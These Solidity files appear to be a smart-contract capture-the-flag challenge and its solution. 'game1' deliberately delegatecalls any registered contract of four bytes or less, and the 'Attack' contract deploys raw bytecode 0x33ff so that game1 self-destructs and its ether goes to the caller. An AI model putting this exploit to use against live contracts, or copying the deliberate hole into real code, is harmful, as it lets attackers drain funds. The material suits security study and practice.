// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract game1 {
    event win(address addr);
    
    address public code;
    address public owner;
    constructor() public payable {
        owner = msg.sender;
    }

    function check(address addr) public {
        uint size;
        assembly { size := extcodesize(addr) }
        require(size > 0 && size <= 4);
        code = addr;
    }

    
    uint public size1;
    function check1(address addr) public returns(uint) {
        uint size;
        assembly { size := extcodesize(addr) }
        // require(size > 0 && size <= 4);
        // code = addr;
        size1 = size;
        return size1;
    }

    function execute() public {
        require(code != address(0));
        code.delegatecall(abi.encodeWithSelector(bytes4(keccak256(""))));
        selfdestruct(address(uint160(owner)));
    }

    function getBouns() public payable {
        require(msg.value >= 233333 ether);
        emit win(msg.sender);
        msg.sender.transfer(address(this).balance);
    }
    
    function() external payable {}

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}


// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract code {
    constructor() public {
        bytes memory bytecode = hex'33ff';
        assembly {
            return (add(bytecode, 0x20), mload(bytecode))
            }
    }
    
    address payable to = msg.sender;
    
    function() external payable {
        to.transfer(address(this).balance);
    }

    function kill() public {
        selfdestruct(address(uint160(to)));
    }

}


// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract Attack {
    constructor() public {
        bytes memory bytecode = hex'33ff';
        assembly {
            return (add(bytecode, 0x20), mload(bytecode))
        }
     }
}
